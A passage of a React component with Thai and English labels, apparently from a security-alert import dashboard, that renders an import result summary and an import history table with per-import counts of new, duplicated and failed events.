                      </span>
                    </div>
                    <div className="text-xs font-bold text-slate-900 dark:text-white truncate mt-0.5">
                      {a.description}
                    </div>
                  </div>
                  <span className="px-2.5 py-1 rounded-lg bg-emerald-600 text-white text-[11px] font-extrabold shrink-0 inline-flex items-center gap-1">
                    ดูรายละเอียด <ArrowRight className="w-3 h-3" />
                  </span>
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* 3. Import Result Summary (ส่วนที่ 3: แสดงผลหลังนำเข้าเฉพาะเมื่อมีการนำเข้าใน Session ปัจจุบัน) */}
      {latestResult && (
      <div className="sylva-glass-card rounded-[26px] p-6 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-200 dark:border-slate-700/80 pb-3">
          <h3 className="text-sm font-extrabold text-slate-900 dark:text-white uppercase flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
            ส่วนที่ 3: ผลลัพธ์การนำเข้าข้อมูลล่าสุด (Import Result — {latestResult.filename})
          </h3>
          <span
            className={`px-3 py-1 rounded-full text-xs font-mono font-bold border ${
              latestResult.status === 'SUCCESS'
                ? 'bg-emerald-100 text-emerald-800 border-emerald-300 dark:bg-emerald-500/20 dark:text-emerald-200 dark:border-emerald-400/40'
                : 'bg-rose-100 text-rose-800 border-rose-300 dark:bg-rose-500/20 dark:text-rose-200 dark:border-rose-400/40'
            }`}
          >
            Status: {latestResult.status}
          </span>
        </div>

        {/*Result KPI Cards — min-w-0 & overflow-hidden so text never overflows */}
        <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
          <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-900/80 border border-slate-200 dark:border-slate-700 min-w-0 overflow-hidden">
            <div className="text-xs font-bold text-slate-500 dark:text-slate-400 truncate">Total Events</div>
            <div className="text-2xl font-extrabold text-slate-900 dark:text-white mt-0.5 truncate">
              {latestResult.totalEvents}
            </div>
          </div>
          <div className="p-3.5 rounded-2xl bg-emerald-50 dark:bg-emerald-500/15 border border-emerald-300 dark:border-emerald-400/30 min-w-0 overflow-hidden">
            <div className="text-xs font-bold text-emerald-800 dark:text-emerald-300 truncate">New Events</div>
            <div className="text-2xl font-extrabold text-emerald-700 dark:text-emerald-300 mt-0.5 truncate">
              {latestResult.newEvents}
            </div>
          </div>
          <div className="p-3.5 rounded-2xl bg-amber-50 dark:bg-amber-500/15 border border-amber-300 dark:border-amber-400/30 min-w-0 overflow-hidden">
            <div className="text-xs font-bold text-amber-800 dark:text-amber-300 truncate">
              Duplicated Events
            </div>
            <div className="text-2xl font-extrabold text-amber-700 dark:text-amber-300 mt-0.5 truncate">
              {latestResult.duplicatedEvents}
            </div>
          </div>
          <div className="p-3.5 rounded-2xl bg-rose-50 dark:bg-rose-500/15 border border-rose-300 dark:border-rose-400/30 min-w-0 overflow-hidden">
            <div className="text-xs font-bold text-rose-800 dark:text-rose-300 truncate">Failed Events</div>
            <div className="text-2xl font-extrabold text-rose-700 dark:text-rose-300 mt-0.5 truncate">
              {latestResult.failedEvents}
            </div>
          </div>
          <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-900/80 border border-slate-200 dark:border-slate-700 flex flex-col justify-between min-w-0 overflow-hidden">
            <div className="text-xs font-bold text-slate-500 dark:text-slate-400 truncate">Import Status</div>
            <div className="text-base font-mono font-extrabold text-emerald-700 dark:text-emerald-400 truncate">
              {latestResult.status}
            </div>
          </div>
        </div>
      </div>
      )}

      {/* 4. ประวัติการนำเข้าข้อมูล (Import History Table) */}
      <div className="sylva-glass-card rounded-[26px] p-6 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
            <History className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
            ส่วนที่ 4: ประวัติการนำเข้าข้อมูล (Import History & Deduplication Log)
          </h3>
          <span className="text-xs font-medium text-slate-500 dark:text-slate-400">
            * ระบบตรวจสอบ Event ID และข้อมูลเฉพาะของ Event (Rule ID, Host, IP, Description) เพื่อป้องกันการนำ Alert เดิมเข้าซ้ำ
          </span>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse">
            <thead>
              <tr className="text-[11px] font-bold uppercase text-slate-600 dark:text-slate-300 bg-slate-50 dark:bg-slate-800/80 border-b border-slate-200 dark:border-slate-700">
                <th className="py-2.5 px-3">Import ID</th>
                <th className="py-2.5 px-3">วันที่และเวลา</th>
                <th className="py-2.5 px-3">Source</th>
                <th className="py-2.5 px-3">ชื่อไฟล์</th>
                <th className="py-2.5 px-3 text-center">New Events</th>
                <th className="py-2.5 px-3 text-center">Duplicated Events</th>
                <th className="py-2.5 px-3 text-center">Failed Events</th>
                <th className="py-2.5 px-3 text-right">สถานะการนำเข้า</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-200 dark:divide-slate-700/70 text-xs font-medium">
              {history.length === 0 ? (
                <tr>
                  <td
                    colSpan={8}
                    className="py-6 px-3 text-center text-xs font-semibold text-slate-500 dark:text-slate-400"
                  >
                    ยังไม่มีประวัติการนำเข้าข้อมูลใน Session ปัจจุบัน (เมื่อกด End Session ข้อมูลชั่วคราวทั้งหมดจะถูกล้างออกอัตโนมัติ)
                  </td>
                </tr>
              ) : (
                history.map((h) => (
                <tr key={h.id} className="hover:bg-slate-50 dark:hover:bg-slate-800/60">
                  <td className="py-3 px-3 font-mono font-bold text-emerald-700 dark:text-emerald-400 whitespace-nowrap">
                    {h.id}
                  </td>
                  <td className="py-3 px-3 font-mono text-slate-600 dark:text-slate-300 whitespace-nowrap">
                    {h.timestamp}
                  </td>
                  <td className="py-3 px-3 font-bold text-slate-900 dark:text-white whitespace-nowrap">
                    {h.sourceType}
                  </td>
                  <td className="py-3 px-3 text-slate-700 dark:text-slate-200">{h.filename}</td>
                  <td className="py-3 px-3 text-center whitespace-nowrap">
                    <span className="px-2.5 py-1 rounded-full font-mono font-bold bg-emerald-100 text-emerald-800 dark:bg-emerald-500/20 dark:text-emerald-200 border border-emerald-300 dark:border-emerald-400/40">
                      {h.ingestedCount} New Events
                    </span>
                  </td>
                  <td className="py-3 px-3 text-center whitespace-nowrap">
                    <span
                      className={`px-2.5 py-1 rounded-full font-mono font-bold border ${
                        h.deduplicatedCount > 0
                          ? 'bg-amber-100 text-amber-800 border-amber-300 dark:bg-amber-500/20 dark:text-amber-200 dark:border-amber-400/40'
                          : 'bg-slate-100 text-slate-600 border-slate-300 dark:bg-slate-800 dark:text-slate-300 dark:border-slate-700'
                      }`}
                    >
                      {h.deduplicatedCount} Duplicated
                    </span>
                  </td>
                  <td className="py-3 px-3 text-center font-mono font-bold text-rose-600 dark:text-rose-400 whitespace-nowrap">
                    {h.failedCount} Failed
                  </td>
                  <td className="py-3 px-3 text-right whitespace-nowrap">
                    <span
                      className={`px-2.5 py-0.5 rounded-full text-[11px] font-bold border ${
                        h.status === 'SUCCESS'
                          ? 'bg-emerald-100 text-emerald-800 border-emerald-300 dark:bg-emerald-500/20 dark:text-emerald-200 dark:border-emerald-400/40'
                          : 'bg-rose-100 text-rose-800 border-rose-300 dark:bg-rose-500/20 dark:text-rose-200 dark:border-rose-400/40'
                      }`}
                    >
                      {h.status}
                    </span>
                  </td>
                </tr>
              ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
